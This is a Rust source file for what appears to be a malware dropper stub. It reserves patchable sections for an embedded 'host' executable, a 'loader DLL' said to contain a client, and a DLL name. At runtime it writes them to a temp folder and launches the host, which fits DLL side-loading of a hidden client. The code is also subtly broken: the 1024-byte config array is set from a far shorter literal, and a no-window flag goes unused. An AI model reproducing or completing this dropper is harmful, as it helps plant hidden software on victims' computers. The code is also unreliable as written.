use std::fs::File;
use std::io::Write;
use std::os::windows::process::CommandExt;
use std::process::Command;

// These will be patched by the builder
// 100MB buffer for the host executable
#[link_section = ".host"]
static HOST_EXE: [u8; 100 * 1024 * 1024] = {
    let mut b = [0u8; 100 * 1024 * 1024];
    let marker = b"HOST_MARKER_PLACEHOLDER";
    let mut i = 0;
    while i < marker.len() {
        b[i] = marker[i];
        i += 1;
    }
    b
};

// 30MB buffer for the loader DLL (which contains the client)
#[link_section = ".dll"]
static LOADER_DLL: [u8; 30 * 1024 * 1024] = {
    let mut b = [0u8; 30 * 1024 * 1024];
    let marker = b"DLL_MARKER_PLACEHOLDER";
    let mut i = 0;
    while i < marker.len() {
        b[i] = marker[i];
        i += 1;
    }
    b
};

#[link_section = ".config"]
static CONFIG: [u8; 1024] = *b"CONF_MARKER_PLACEHOLDER\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

const CREATE_NO_WINDOW: u32 = 0x08000000;

fn main() {
    let mut temp_dir = std::env::temp_dir();
    temp_dir.push(format!("tmp_{}", std::process::id()));
    let _ = std::fs::create_dir_all(&temp_dir);

    let host_path = temp_dir.join("host.exe");
    let config_str = std::str::from_utf8(&CONFIG).unwrap_or("loader.dll");
    let dll_name = config_str.split('\0').next().unwrap_or("loader.dll");

    let dll_path = temp_dir.join(dll_name);

    // Extract Host
    if let Ok(mut file) = File::create(&host_path) {
        let _ = file.write_all(&HOST_EXE);
    }

    // Extract DLL
    if let Ok(mut file) = File::create(&dll_path) {
        let _ = file.write_all(&LOADER_DLL);
    }

    // Run Host
    let _ = Command::new(&host_path)
        .current_dir(&temp_dir)
        .spawn();
}
